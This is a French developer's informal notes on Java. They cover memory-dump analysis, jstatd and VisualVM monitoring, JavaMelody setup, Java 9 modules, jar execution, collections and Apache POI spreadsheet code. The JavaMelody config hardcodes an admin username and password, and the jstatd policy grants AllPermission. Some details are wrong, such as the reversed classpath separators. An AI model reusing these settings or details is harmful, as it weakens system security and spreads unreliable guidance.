            wikipedia francois foulon :http://collaboration2010.sharepoint.renault.fr/is/dsd/places/tec/Wiki%20Component/IBM%20Support%20Assistant%20at%20RENAULT.asp				
            pour analyser les problemes de heap space java dump de memoire out of memory exception performance performence oom
                                    ps -ef | grep NOMDUPROCESSDEMONSERVEUR
                                    trouver l'id du process java (dessus est marque le heapdumpPath)
                                    Aller dans le heapdumpPath. Dans ce path, les logs de dump de memoire s'appellent: java_pidxxxx.hprof (le path est /jboss/logs/S07AS01/ chez Renault wec)
                                    telecharger ce fichier sur mon poste.
                                    Demarrer IBM Supprt assistant (de son petit nom ISA): outil pour analyser les logs de de dump memoire heap space out of memory error java
                                        C:\ISA\ISA5 start_isa.bat en mode admin > aller sur https://localhost:10943/isa5
                                        tools>Memory Analyzer [Desktop]
                                        aller dans launch activity > analyse problem >Choisir un analyseur: Ibm Monitoring and Diagnostic Tools for Java Memory Analyser 64 bits
                                            >Memory Analyzer >File >open heap dump>choisir mon fichier.
                                            >open denominator tree for entire heap pour voir les plus gros consommateurs
              pour voir l'evolution de la memoire en live :
                  depuis java11: java flight recorder: 
                      java -XX:StartFlightRecording (Jamais testé)
                    ou java mission control : https://jdk.java.net/jmc (Jamais testé )
                  avant:
                      d'abord donner les droits à jstatd de d'envoyer les infos logs JVM à un client sans faire d'exeption de securite
                      vi /etc/jstatd.policy  et ecrire
                      grant codebase "file:${java.home}/../lib/tools.jar" {
                      permission java.security.AllPermission;
                      }; 
                ensuie aller dans which java /default/bin
                et demarrer jstatd : performances 
                  nohup ./jstatd -J-Djava.security.policy=/etc/jstatd.policy &            
                  et apres on peut lancer le client sur mon poste : aller sous la jdk et tapper "jvisualvm"   (D:\LocalData\p036782\visualVM\visualvm_138\bin\visualvm.exe)
                                                                    en local on peut voir tous les process en direct :-) sinon:
                                                                    remote>add Remote Host
                                                                    trouver l'id du process que je veux surveiller
                                                                    ps -ef | grep NOMDUPROCESSDEMONSERVEUR
                                                                    trouver l'id du process java (dessus est marque le heapdumpPath**)
                                                                    et le retrouver ensuite sur jvisualvm et cliquer dessus
                                                                    > onglet visualGC ou Monitor
                  on peut aussi utiliser eclipse LUNA -> eclipse MAT en ouvrant le fichier de dump                                                                
              JAVA MELODY : JAVAMELODY : bof voir ci dessus visualvm
                            dans le pom du projet
                                   <dependency>
                                        <groupId>net.bull.javamelody</groupId>
                                        <artifactId>javamelody-core</artifactId>
                                        <version>1.60.0</version>
                                </dependency>    
                                    dans le
                                    <profiles>...<properties>...
                                      <!-- JAVA MELODY -->
                                           <home_sia>D:/temp/javamelody</home_sia>
                                         <!-- /JAVA MELODY -->
                                         ...</properties>...</profiles>
                          dans web.xml
                                              		<!-- JAVA MELODY -->
                                            <filter>
                                                            <filter-name>monitoring</filter-name>
                                                            <filter-class>net.bull.javamelody.MonitoringFilter</filter-class>
                                                            <init-param>
                                                        <param-name>authorized-users</param-name>
                                                        <param-value>WEC_ADM:WEC1234</param-value>
                                                    </init-param>                              
                                            </filter>
                                             
                                            <filter-mapping>
                                                            <filter-name>monitoring</filter-name>
                                                            <url-pattern>/*</url-pattern>
                                            </filter-mapping>
                                             
                                            <listener>
                                                            <listener-class>net.bull.javamelody.SessionListener</listener-class>
                                            </listener>
                                            		<!-- /JAVA MELODY -->
                                            		
                                     puis aller sous http://localhost:8080/wec/monitoring       		
    problème de performances en Java? ehcache : 
          voir http://www.ehcache.org/ +  aussi s'assurer que le navigateur utilise le cache (grace au header) + la connexion ne se ferme pas chaque fois dans le cas du https sinon à chaque requette il faut refaire un shakehands   
java9 : java 9 : java11 : java10 : 
  besoin maven 3.5.x
  Jdk A8 devient divisé en modules xxx.jmod = 1jar = 1 ou plsrs package. un module peut dépendre de x modules et inversement.
                                  defini dans monapplimodule1/src/main/java/module-info.java |_lun ou l'autre mais ca doit etre le repertoire declare comme source
                                              monapplimodule2/src/module-info.java           |
                                              monapplimodule2/src/paquage.numero.un/...etc...
                                  module-info.java: // si absent, java9 maet tout en unnamed et ça marche qd meme
                                                                      automatic module : export tout requires tout (jar n'ayant pas de module-info.class: du coup son nom de module c'est le nom du jar et si j'ai IllegalArgumentException FindException Invalid module name c'est parce que le nom du jar a un chiffre et c'est interdit pour un module)
                                                                      unamed module: exporte rien requires tout
                                                                      Si deux modules(automatic ou non) qui export le meme package -> interdit: ne pas migrer vers java9
                                    module mon.nom.du.module{ //a un nom (doit être unique dans un repertoire) par forcement le même que le nom des packages dedans (recommandé:= nom package a l'envers) ni le meme nom que le .jar qui le contient(intellij met par defaut le nom du module intellij)
                                        requires autre.module; // liste des modules qu'il importe car il en a besoin (mais ne peut lire que les packages exportés par cet autre module. Si j'utilise la classe sans la déclarer ici: j'ai une erreur à la compile et au runtime)
                                        requires nomD'unJarSansLe.jarEtles-SontRemplacesParDes.EtLaVersionDegage // si ce jar n'a pas été modularisé en java9 car appartient à vieux java. c'est un "automatic module" (!= unammed module: jars declarés dans le cp classpath et qui ne sont pas des modules mais dont j'ai besoin)
                                                                                                                  si par hasard deux jars ont le meme nom: changer le VRAI nom de l'un d'eux en modifiant le MANIFEST.MF ou je peux y definir le nom de mon jar (meme si le nom du fichier est different)
                                        requires public autre.module.dont.j'ai.besoin.et.que.j'exporte.aussi.pour.les.autres.modules.qui.dependent.de.moi.comme.ca.ceux-ci.n'ont.pas.besoin.de.requirer.ce.module;
                                        require transitive autreModule.que.ce.module.expose // comme ca les modules qui utilisent mon.nom.du.module pourront utiliser implicitement autreModule.que.ce.module.expose sans avoir besoin de le déclarer aussi.
                                        exports un.package;    //  liste des packages qu'il exporte pour les autres modules: bonne pratique: exporter les interfaces mais pas les classes qu'elles implémentent Elles seront accessibles a travers l'interface. wildcard interdit, aller jusqu'au package final qui contient la classe dont on a besoin
                                        exports un.package to le.nom.du.seul.module.qui.a.le.droit.de.l'utiliser
                                        opens un.package (to un.module) // pareil que export mais en plus le code peut etre introspecté reflection. a mettre si j'ai erreur Caused by: java.lang.IllegalAccessException: class une.classe.de.librairie.LauncherImpl (in module module.de.librairie) cannot access class monpackage.Maclasse (in module monmodule) because module monmodule does not export mon.package to module mondule.de.librairie
                                        provides xx.xx.UneClasseDeCeModule with yy.yy.LInterfaceExposeeDeCetteClasse(qui peut etre dans un autre module mais dans ce cas il faut rajouter le require de cet autre module)(voir l'utilisation ci dessous)
                                      }
                                        // et dans un autre module qui va avoir besoin de la classe UneClasseDeCeModule:
                                        (...)
                                        requires yy.yy.LInterfaceExposeeDeCetteClasse 
                                        uses xx.xx.UneClasseDeCeModule // du coup avec ServiceLoader je peux utiliser la classe implementant l'interface... A FAIRE 
                                    }
                    nom.du.module/pack.(/)age.(/)com/UneClasse.java ou un-module.java(26:41)
                                                package pack.age.com;
                                                public class UneClasse{...}
                    com.agiledev.user/com/agile/dev/user/User.java
                                                          package com.agile.dev.user;
                                                          import pack.age.com.*;
                                                          public class User{  // si non public, même si on exporte son package, ne sera pas visible par les autres modules
                                                              public static void main(String[] args)
                                                              {
                                                                  UneClasse toto = new UneClasse();
                                                              }
                                                          }
                  compiler:
                      javac --module-path /=ModulePath/chemin/vers/les/modules/dont/ici/je/depend -d repertoire/de/sortie/des/class 'find pathFichiersjavaatrouver -name *.java' // devient un .class
                              maven: pour les dependances à des automatic modules utiliser : 
                                          <plugin>
                                                  <groupId>org.apache.maven.plugins</groupId>
                                                  <artifactId>maven-compiler-plugin</artifactId>
                                                  <version>3.8.0</version>
                                                  <configuration>
                                                      <release>10</release>
                                                      <source>10</source> // normalement ça on a pas besoin mais je le mets qd meme sinon lors execution tests dans intellij j'ai erreur Error:java: release version 5 not supported... sinon j'ai du carrement refaire le projet (pb peut etre avec les metadatas intellij)
                                                      <target>10</target>
                                                  </configuration>
                                              </plugin>

                  creer jar:
                       jar -c -f repertoire/nouveaujar.jar --module-version x.y.z(--module-version estFacultatif) --main-class facultatif.package.et.classeMain -C chemin/ousontMesClassCompilees //-c créer une archive; -f situation et nom du jar.
                       jar -p -f repertoire/nouveaujar.jar // pour voir le détail de ce module, sa version et ses requires ses exports et ses conceals(ce qu'il n'exporte pas je crois) //-p equivalent de --module-path 
                  executer: 
                      java --module-path /=ModulePath/chemin/vers/les/modules/dont/ici/je/depend -m nom.du.module(/facultatif.package.et.ClassMainAExecuter) // entre parentheses: obligatoire si je n'ai pas compilé avec --main-class ci dessus
                          -classpath est valide si on veut porter du code/jars java <9 sur un java9 // tout ce qui sera dans le classpath sera stocké dans un unnamedmodule mais les named modules java9 ne peuvent pas dependre de ces unnamedmodules.
                  Créer un executable adapté à la plateforme sur laquelle je suis. est léger: attention jlink ne marche pas avec les automatic modules dont mon rootmodule depend
                      jlink --module-path /path/vers/tous/mes/modules.jar;/meme/mon/mes/root/modules.jar --add-modules nom.de.mon.module.a.rendre.executable --addmods nom.(jamaisfait)encore.dun.autre.module --output nomdel'appliExecutableCree 
                      // en fait il crée un repertoire avec /bin dedans avec mon propre java dedans. je peux faire voir LINKjavalistmod sur ce java là.
                      mon programme est executable via l'appelle à ./mon.module.qui.est.sous.bin                       
                  voir le diagramme des dependances
                      "C:\Program Files\Java\jdk-10.0.2\bin\jdeps" -v -R --module-path path/vers/jars/.jarsModulairesOuAutomatiques_wildcardInterdit_allerjusqu'auxjars;/separe/par/pointvirgule/xx.jar -cp path/vers/repertoires/contenant/.jarsUnamed/* vers/mon/jarAAnalyser.jarOuUn.class? // -v pour verbose -R pour recursive
                      jdeps -genmoduleinfo un/repertoire/ou/ecrire/le/resultat *.jar // voir les dependances de tous les jars. dispo depuis java8  
                      java -listmods // renvoit les modules dont mon java jvm dépend LINKjavalistmod
                  execution
                      java --module-path ./path/repertoire/contenant/tous/les/jars --module nom.de.mon.module/package.et.nom.DeMaClasseMain
                      java --module-path C:/Users/Laurent/.m2/repository/log4j/log4j/1.2.14/log4j-1.2.14.jar;memoclap.utils-2.19.0.jar --module memoclap.utils/utils.Utils E:/www/kanail/AudioLoopOnline/java/MemOclapUtils/src/test/resources/d
                      java --module-path C:/Users/Laurent/.m2/repository/log4j/log4j/1.2.14/log4j-1.2.14.jar;memoclap.utils-2.19.0.jar -cp C:/Users/Laurent/.m2/repository/com/googlecode/soundlibs/tritonus-share/0.3.7-2/tritonus-share-0.3.7-2.jar;C:/Users/Laurent/.m2/repository/com/googlecode/soundlibs/mp3spi/1.9.5-1/mp3spi-1.9.5-1.jar;C:/Users/Laurent/.m2/repository/com/googlecode/soundlibs/vorbisspi/1.0.3-1/vorbisspi-1.0.3-1.jar --module memoclap.utils/utils.Utils E:/www/kanail/AudioLoopOnline/java/MemOclapUtils/src/test/resources/d
       repl: jshell:
            tapper jshell et je peux tester des petit bouts snippets de code java sans m'inqueter des exeptions et des ";" point virgules                                                       
      depuis java9 existe aussi - VarHandle pour passer rapidos de noeud en noeud d'un coup.
                                - ProcessBuilder: executer une commande externe sortir pid unix linux autre programme process
java10 : java 10 :
    var: bof eviter                                                                         
pour lancer executer un programme java faire ca: (ATTENTION ne marche plus depuis la version 1.6?)
depuis java9 si j'ai Caused by: java.lang.ClassNotFoundException: javax.activation.DataSource (c parce que ca a degagé de la jvm alors ratacher le module automatique avec maven : 
                <dependency>
                  <groupId>com.sun.activation</groupId>
                  <artifactId>javax.activation</artifactId>
                  <version>1.2.0</version>
              </dependency>
Depuis la version 1.6 utiliser -classpath ou -cp (c pareil) et separer par des ; sur unix ou: sur windows (on peut metre * (mais pas dans le manifest)) Attention! (-cp;-classpath) et -jar sont incompatibles: -jar prend le dessus donc faire un manifest voir LINK5*55*5
    exemple: java -cp "C:\jdevStudioWorkspace\Dialogys_MPF_pour_serveur\LibrairiesDialogys\*";"DialogysServer.jar"  dialogys.rmi.serveur.vue.Serveur
              java -classpath acrobat.zip;AppClasses.jar ; ou plutot : commons-httpclient-2.0.jar;ou:commons-logging.jar dialogys.chapeau.DialogysStarter
              java -Duser.dir=C:\jdevStudioWorkspace\Dialogys_OC\Dialogys_MPF_pour_serveur\data -Djava.library.path="C:\jdevStudioWorkspace\Librairies~1" -jar Dialogys.jar dialogys.chapeau.DialogysStarter 
			     java -cp JimiProClasses.jar:. convertisseur.Lancer (le jar qui contient la classe main qu'on veut lancer doit etre dans le classpath -cp)
			     si j'ai erreur no main manifest attribute ou bien aucun attribut manifest principal 
			         c parce que quand on fait -jar c pour executer un jar qui CONTIENT un MANIFEST.MF. si j'en ai pas alors passer par -cp ou -classpath comme ci-dessus
		si on veut logger4j: 
					-Dlog4j.configuration=/conf/log4j.properties (c'est par rapport au chemain d'ou on a lance sinon faire:) -Dlog4j.configuration=file:/pathcomplet/conf/log4j.properties
           -Dlog4j.configuration=log4j.properties (c'est par rapport au chemain d'ou on a lance)   
		execution d'un .jar: le jar contient un META-INF/MANIFEST.MF qui contient ca: Manifest-Version: 1.0 (un jar ne contient pas d'autre jar. Mais un war il peut contenir d'autres jar. le classpath eventuellement defini dans le manifest fait appel à des lib externes)
                                                                                    Main-Class: renault.saj.batch.SchedulerJobs
        @echo off
        java -jar SajBatch.jar (et dans ce cas grace au manifest pas besoin de mettre ici la classe main)
        ou                                                                                    
				java -cp PAE.jar:. -jar PAE.jar 
				ou
				"C:\Program Files\JavaSoft\JRE\1.5.0_12\bin\javaw.exe" -jar monJar.jar
				si on a un noclassdeffounderror voir plus bas
		execution d'un .class: (qui s'appelle Main.class)
				java Main
		execution d'un .class en envoyer une propriete à la jvm LINKù*ù
					$ java -DTOTOTI="blabli" Main
		execution d'un .class en envoyer une propriete = à une variable d'environneent à la jvm
					$ java -DTOTOTI=$TOTOTI Main
		si le chemin vers java est complique: et est loin (Program files):  ~1 pour les espaces
					blabla/Program~1/blalba/java -cp PAE.jar:. -jar PAE.jar 
		autre facon d'envoyer une variable au programme java (exemple dans un .sh): 
		            #!/bin/bash
								CLASSPATH=/appli01/dpfdev01/dpf/vcour/batch/dpfBatch.jar
								CLASSES12=/appli01/dpfdev01/dpf/vcour/batch/lib/classes12.zip
								#export CLASSPATH
								#export CLASSES12
								java -classpath $CLASSPATH:$CLASSES12 renault.dpf.batch.PaiementsMain -BLABLA=/appli01/dpfdev01/dpf/vcour/batch/conf/dpfBatch.conf
								Et en java ecrire: 
								if (arg.startsWith("BLABLA"))
								{
										String propriete = arg.substring(arg.indexOf('=') + 1);
								}
		attention le manifest si il est cree sur windows il faut que dedans il y ait Main-Class: blbla.blalba et entree a la fin (retour chario)
		si on a l'erreur noclassdeffounderror mettre dans le manifest le classpath (le jar est alors a l'exterieur du jar execute) un jar ne contient jamais d'autres jar à l'interieur sauf avec des outils style uberJar bof...: les librairies sont toujours externalisees
      		Manifest-Version: 1.0
      		Main-Class: sltpl.Main
      		Class-Path: ./f1j11swing.jar ./autre.jar (séparer par des espaces. ce chemin exterieur au jar est relatif par rapport à la situation du jar qu'on execute (ne pas oublier retour chario a la fin!!)) LINK5*55*5
	autre exemple de manifest: 
      	Manifest-Version: 1.0
        Main-Class: renault.gdv.gdvTCRBatchExportFiles.GdvExport
        Class-Path: ./lib/arca_5313.jar ./lib/ldap_41.jar  ./lib/log4j.jar ./lib/ojdbc14.jar ./config/ //attention les wildcards ne marchent pas ici
		
		Si on a mis cette execution dans un point bat et qu'il ne trouve pas le chemin vers la jre: metre ca:
					Set Path=C:\Program files/JavaSoft/JRE/1.5.0_08/bin
					java  -jar SeleniumLogToPrimaLog.jar
pour copier les proprietes d'un bean formulaire vers un autre bean de type info par exemple faire: mapper maper un objet java transformer en un autre bean  
						org.apache.commons.beanutils.BeanUtils.copyProperties(Object dest, Object orig) // preferer peut etre ModelMapper plus parametrable mais pas tres performant 
pour recuperer une variable d'environnement qui est declaree dans web.xml:
			pour recuperer le numero de version
			String ttfPath = (String)ServiceLocator.getInstance().getRefByName("NOM_DE_LA_VARIABLE");

pour recuperer le retour chariot: public static final String CHARIO = System.getProperty("line.separator"); // a partir de java 5.1 on peut mettre "%n" // recupère prop de la jvm voir LINKù*ù
pour recuperer le caractere espace: c'est ca tout simplement: " "
pour savoir si un charactere est de type espace:  Character.isSpaceChar(echar)
pour transformer un tableau de byte en string: 
ByteArrayOutputStream byaos = new ByteArrayOutputStream(tableau de byte);
byaos.toString();

Bonne pratique d'utilisation de tableaux en Java: (et de tableaux de tableaux)
PREFERER List à Vector et Map à Hashtable (Map est l'interface de Hashtable). On peut utiliser HashMap quand nous ne travaillons pas en multithreading.?La modification en HashMap sera plus rapide si le reste du code utilise l'interface Map. Map n'est pas trié trie
                                |_peut etre gourmand en ressources si trop utilisé
attention etre prudent avec une Map dans du multithreading: mieux vaut recreer une map que faire des remov add quand on est en multi-threading
- List<Captage> listCaptage = new Vector<Captage>();
- Vector<Vector<Cell>> data = this.generateData(10);
- private Vector<Vector<Cell>> generateData (int nbRow) {
- row = new Vector<Cell> ();
- public void addDataSheet (Collection<? extends Collection<Cell>> data, ... etc...)
- for (Iterator<? extends Collection<Cell>> loop = data.iterator(); loop.hasNext(); ) {
- Map<String, Indicateur> indicatorsCalulated = calculateIndicateurs(firstWeekForReportFile,lastWeekForReportFile,compteTransporteur);
Cela permet aux methodes d'acceptent des structures de donnees Java de type « liste de liste » ou bien « Vecteur de Vecteur ».
pour faire un Set<X> depuis java9:
  Set<String> tata = Set.of("itit","toto");  
pour faire un Map<X> depuis java9:
  Map<String,Truc> toto = ofEntries(
    entry("12",HAHA),
    entry("1df2",HAHA),...
    ));

attention une hashmap n'a pas d'ordre.. et pas de doublons non plus d'apres Portal. Sur? 
  utiliser LinkedHashMap qui conserve l'ordre dans lequel on a insere les donnees.
  utiliser TreeMap qui est capable de reordoner apres des insertions comme on veut 
  remarque (attention: jsonobject n'utilise que des hashmap)
pour initialiser une map: (depuis java9) 
  Map<String, String> test2 = Map.ofEntries(
    entry("a", "b"),
    entry("c", "d")
  );
pour initialiser un autre type de map ou une linkedhashmap: (depuis java9)
 LinkedHashMap<Double,String> totoSil = new LinkedHashMap<>(Map.ofEntries(
        entry(0.0, "b"),
        entry(1.0, "d")
    ));
Pour parcourir une hashmap:
			HashMap indic = new HashMap(); etc etc.. est remplie.
			Set cles = indic.keySet();
			Iterator it = cles.iterator();
			while (it.hasNext()){
			   Object cle = it.next(); // tu peux typer plus finement ici
			   Object valeur = indic.get(cle); // tu peux typer plus finement ici
			   // attention , ici il s'agit de pointeurs avec hashmap car si je modifie cle, et valeur, je modifie directement les objets dans la hashmap
			}
			exemple avec typage plus fin: 
            		Set<String> cles = patterns.keySet();
            		Iterator<String> it = cles.iterator();
            		while (it.hasNext()){
            		String cle = it.next(); // tu peux typer plus finement ici
            		String valeur = patterns.get(cle); // tu peux typer plus finement ici
			
si on a l'erreur ConcurrentModificationException quand on utilise iterator
      c parce que on ne peut pas modifier (supprimer/ajouter des elements) dans une liste si on a deja recupere auparavant son iterateur.. normal quoi.
      Solutions: 
      iterator.remove()
      ou for(XXX xxx: new ArrayList<XXX>(maliste)){
        ...
      }
      ou utiliser l'objet ListIterator
      
      
pour utiliser un iterator qui va en arriere: capable de repositionneer le curseur previous: utiliser listiterator:
            fieldsCandidate est une ArrayList 
            ListIterator<WEC52_M_CHAMPS> it = fieldsCandidate.listIterator();
            		while (it.hasNext())
            		{
            			if (it.next().equals(field)) break;
            		}
            		previousField = it.previous();
                    it.set(unDesObjetsDeMaListe); // par contre ça j'ai l'impression que ca ne marche pas: sert à se positionner sur un objet de ma liste.            
            }
                    
            		 
************************
pour executer une commande externe en java:
Pour lancer votre application externe il vous suffit maintenant d'appeler l'une des six methodes exec() de la classe Runtime et dont voici les declarations :
ne pas faire ca:
Runtime runtime = Runtime.getRuntime();
runtime.exec("monappli param1 param2");
car cela risque de poser des problèmes si l'un de vos paramètres contient un espace. En effet, java utilise le caractère espace pour extraire les differents paramètres de la ligne de commande. Donc si vous avez un paramètre du genre "un paramètre avec des espaces", Java le comprendra comme cinq paramètres differents ("un", "paramètre", "avec", "des", "espaces").
faire ca: 
Runtime runtime = Runtime.getRuntime();
public Process exec(String command, String[] envp, File dir);
ou runtime.exec(new String[] { "monappli", "un paramètre avec des espaces", "param2" } );
ou runtime.exec(new String[] { "C:\\Program Files\\MonAppli\\monappli.exe" } );
Remarque: Les variables d'environnement specifiees doivent l'être selon le format nom=valeur. 
************************
algoritmes java condition : conditions : condition : conditionnels : if :
if (oldUIApplElementInfo.getApplPcbd()!=null && uiapplelementinfo.getApplPcbd()!=null)
if(a&&b&&c)
si a=true b=true c=true->if est true
si un seul false ->if est false: donc il s'arrete dès qu'il ya un false
  Suis sur que c ca.

if(a&b&c)
si a=true, b=false,c=true ->if est false MAIS il va d'abord tout evaluer avant de rendre la reponse. Il ne s'arrete pas au moindre false.

if(a||b||c)
si a=true ->if est true
si a=false et b=true ->if est true : il s'arrete toute de suite si il voit un true

if(a|b|c)
si a=true evalue qd meme b et c puis retourne true car a = true.
si a=false et b=true -> evalue qd meme c puis retourne true car b=true

autre notation: contraction :de if :
libelle.equals("") ? "%" : libelle
equivaut à
if (libelle.equals("")) {return "%";}
else {return libelle;}
ou on peut ecrire:
site=site==null?"%":site;
*********************************	
pour catcher toutes les exception possibles: 
		catcher Throwable
pour faire une expression reguliere : regexp : 
		String str=blabla;
		if (str.matches("[^|]*[|][^|]*[|][^|]*[|][^|]*[|]")) etc etc... ici on cherche une chaine qui ressebmble à lqjsdf|lksdfj|sjklhf|kljsdf|
		il y a aussi une api qui s'appelle Perl5Compiler (org.apache.oro.text.regex.Perl5Compiler;)... c'est peut etre bien?
		regexp majuscules avec accents : utiliser \\p{javaUpperCase}
      exemple: 
		  replaceAll("(\\p{javaUpperCase}{2,30})",
pour savoir si pourcent est dans une chaine de caractère, ne pas faire contains mais monstring.indexOf('%'); 
*********************************	
Pour faire un traitement deporte d'un batch d'une application j2ee: utiliser un flag dans le systeme de fichier
*********************************
pour faire un message avec des {0}{1}{2}...  qui sont remplace par des strings: 
  Utiliser MessageFormat (pour echaper escape des accolades brackets brakets les entourer de signe quote ')
  exemple: 
        Object[] arguments = {new Integer(7),new Date(System.currentTimeMillis()),"a disturbance in the Force"};
          String result = MessageFormat.format("At {1,time} on {1,date}, there was {2} on planet {0,number,integer}.", arguments);
          // attention si notre string qui contient les marqueurs a des single quotes guillement ca ne marche pas!! il faut les remplacer par des doubles single quotes (echappement)
          output: At 12:30 PM on Jul 3, 2053, there was a disturbance in the Force on planet 7.
          ou
          MessageFormat form= new MessageFormat(  "The disk \"{1}\" contains {0} file(s).");
          String result = form.format(arguments);
**********************************	
itext :
Pour generer du pdf en java utiliser l'api Itext (signature possible) (possible faire du excell aussi)
*********************************	
poi : (la version qui marche et qui est homologuee chez Renault c'est 3.0.1)
ATTENTION POI ne compte pas les colonnes (et lignes? ) vides dans son iteration
    // si on veut renvoyer du serveur :
    		        	response.setContentType("application/vnd.ms-excel");
								  response.setHeader("Content-Disposition", "attachment; filename=" + "WecExportCommentComp.xls");
			exemple 1 d'utilisation (avec fonction excell) 
//						String pathDirectory = (String)PersistanceManagerFactorySingleton.getInstance().getWecProperties().getString("REQUESTS_DIRECTORY");
//						File outFile = new File(pathDirectory+"/tempxlsfile.xls"); // en donnant le fichier à poi plutot que le inputstream on est plus efficace niveau memoire
//						FileOutputStream fos = new FileOutputStream(outFile); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
                        si c'est un fichier xlsx:
                                Workbook wb = XSSFWorkbookFactory.create(excelfile); 
                                Sheet sheet = wb.getSheetAt(0);
                                wb.setSheetName(0, "a");
                                Iterator<Row> itrow = sheet.rowIterator();
                                while (itrow.hasNext()){
                                    Row row = itrow.next();
                                    Iterator<Cell> itcols = row.cellIterator();
                                    while (itcols.hasNext())
                                    {
                                        Cell cel = itcols.next();
                                        System.out.println(cel.getStringCellValue());
                            si c'est un fichier xls:					
								HSSFWorkbook workbook = new HSSFWorkbook();
								HSSFSheet sheet = workbook.createSheet();
									r.createCell(0).setCellValue("Id demand");r.createCell(1).setCellValue("Name Resp Real"); r.createCell(2).setCellValue("Domain"); r.createCell(3).setCellValue("SIA"); 
								float rowHeight = r.getHeightInPoints();
								HSSFCellStyle cs = workbook.createCellStyle();
					             cs.setWrapText(true); // retour à la ligne automatique											
								for (int i=1;i< resultSearch.size();i++)
								{
									ligne = replaceSpecialCaracteres(ligne);
									HSSFRow rb = sheet.createRow(i);
									String[] cols = ligne.split("£"); //LINKs.sp.it
									for (int j = 0; j < cols.length; j++)
									{
										cell = rb.createCell(j);
										if (j==10)
										{
											// cellule formulaire      
											cell.setCellStyle(cs);
											cell.setCellType(HSSFCell.CELL_TYPE_FORMULA);
											if (cols[j].length()!=0)
											{
												cell.setCellFormula(cols[j]); // (attention cols[j] ne doit pas depasser 255 char)
												short nbcom =(short) cols[j].split(exelCar).length; //LINKs.sp.it 
											exemples : 
        											cell.setCellFormula("IF(ISERROR(           M"+numrow+"-R"+numrow+   "),\"N/A\",    M"+numrow+"-R"+numrow+")");
        											cell.setCellFormula("IF(OR(ISBLANK(M"+numrow+"),ISBLANK(R"+numrow+")),\"N/A\",M"+numrow+"-R"+numrow+")");
        											cell.setCellFormula("OR(ISBLANK(M"+numrow+"),ISBLANK(R"+numrow+"))");
        											cell.setCellFormula("IF(ISERROR(             IF(M"+numrow+"<=L"+numrow+",\"OK\",IF(S"+numrow+"<=10,\"OK\",\"KO\"))        ),\"N/A\",              IF(M"+numrow+"<=L"+numrow+",\"OK\",IF(S"+numrow+"<=10,\"OK\",\"KO\"))         )");
                              cell.setCellFormula("IF(M"+numrow+"<=L"+numrow+",\"OK\",IF(S"+numrow+"<=10,\"OK\",\"KO\"))");
        											cell.setCellFormula("IF(ISERROR(           IF(M"+numrow+">L"+numrow+",IF(M"+numrow+"<(R"+numrow+"+10),\"Pas de retard\",IF( MIN((M"+numrow+"-L"+numrow+"),(M"+numrow+"-(R"+numrow+"+10)))<>0,MIN((M"+numrow+"-L"+numrow+"),(M"+numrow+"-(R"+numrow+"+10))),\"Pas de retard\")),\"Pas de retard\")       ),\"N/A\",              IF(M"+numrow+">L"+numrow+",IF(M"+numrow+"<(R"+numrow+"+10),\"Pas de retard\",IF( MIN((M"+numrow+"-L"+numrow+"),(M"+numrow+"-(R"+numrow+"+10)))<>0,MIN((M"+numrow+"-L"+numrow+"),(M"+numrow+"-(R"+numrow+"+10))),\"Pas de retard\")),\"Pas de retard\")         )");											

                      	short nbcom =(short) cols[j].split(exelCar).length; //LINKs.sp.it 
												rb.setHeightInPoints(nbcom*rowHeight);
											}
										}
										else
										{
											// cellule basique
											cell.setCellValue(cols[j].length()==0?"":cols[j]);	
										}
										
										// si on veut faire des retours chariot mettre \n dans le texte et
                                 HSSFCellStyle cs = workbook.createCellStyle();
					                       cs.setWrapText(true); // retour à la ligne automatique
                                 cell.setCellStyle(cs);
									}
								}
								//sheet.autoSizeColumn(10, false); // pour que la largeur de la colonne 10 s'ajuste automatiquement. 
								sheet.setColumnWidth(10, 256*200); //Sinon on peut aussi utiliser setColumnWidth(int columnIndex, int width) from class Sheet;
						//workbook.write(fos); // Write workbook to response.
						workbook.write(response.getOutputStream());						
    Exemple 2 d'utilisation								
             InputStream fis = Thread.currentThread().getContextClassLoader().getResourceAsStream("fichiertempalte.xls"); KO en java9 voir LINKgetRes9 verifier avec System.out.println("CLASSPATH: " + System.getProperty("java.class.path")); System.out.println("ClassLoader resource path: " + HRParameters.class.getClassLoader().getResource("hr-openhr-for-ta.properties")); System.out.println("ClassLoader resource path: " + ClassLoader.getSystemResourceAsStream("hr-openhr-for-ta.properties"));
          		POIFSFileSystem xlsFile = new POIFSFileSystem(fis);
          		HSSFWorkbook wb = new HSSFWorkbook(xlsFile);
          		fis.close();
             HSSFSheet sheet = wb.getSheetAt(0);
        		wb.setSheetName(0, I18NManager.get("SCR03_SHEETNAME", language));
        		/*ecriture*/
        		HSSFRow row = sheet.getRow(rowNumber);
            HSSFRichTextString value;
            if (row == null) 
            {
            			row = sheet.createRow(rowNumber);
            			for (short i = 0; i < sheet.getRow(4).getLastCellNum(); i++) 
                  {
            				HSSFCell cell = row.createCell(i);
            				cell.setCellStyle(sheet.getRow(rowNumber % 2 + 5).getCell(i).getCellStyle());
            			}
         		}
            value = new HSSFRichTextString(action.getElement().getIdentification().toString());
		        row.getCell((short) Constants.ACTION_IDENTIFICA_COLNUM).setCellValue(value);
  pour ecrire des cellules au format date :
        				String lngdates="";
        				String simpleDateFormatlngdate="";
        				String exelCar="";
        				if (I18NService.getSessionLangue(request).equals("en"))
        				{
        					lngdates= "MM/DD/YYYY";
        					exelCar="CHAR";
        					simpleDateFormatlngdate = "MM/dd/yyyy";
        				}
        				else
        				{
        					lngdates="DD/MM/YYYY";
        					exelCar="CHAR";
        					simpleDateFormatlngdate = "dd/MM/yyyy";
        				}
        				String simpleDateFormatHours = "hh:mm"; 
          			CreationHelper createHelper = workbook.getCreationHelper();
          			HSSFCellStyle csWarp = workbook.createCellStyle();
							  csWarp.setWrapText(true);							
							  HSSFCellStyle csDate = workbook.createCellStyle();
							  csDate.setDataFormat(createHelper.createDataFormat().getFormat(lngdates));
							  SimpleDateFormat sdf = new SimpleDateFormat(simpleDateFormatlngdate+ " " +simpleDateFormatHours); // attention n'est pas threadsafe.
                // celulle date heure                                                                                 
								cell.setCellType(Cell.CELL_TYPE_NUMERIC);
								if (cols[j].length()==0)
								{
										  cell.setCellValue("");
								}
								else
								{
									     Date date1 = sdf.parse(cols[j]);
									     cell.setCellStyle(csDate);
									     cell.setCellValue(date1);
							   }
pour faire des formules excell : 
    cell.setCellFormula("IF(M"+numrow+"<=L"+numrow+",\"OK\",IF(S"+numrow+"<=10,\"OK\",\"KO\"))");
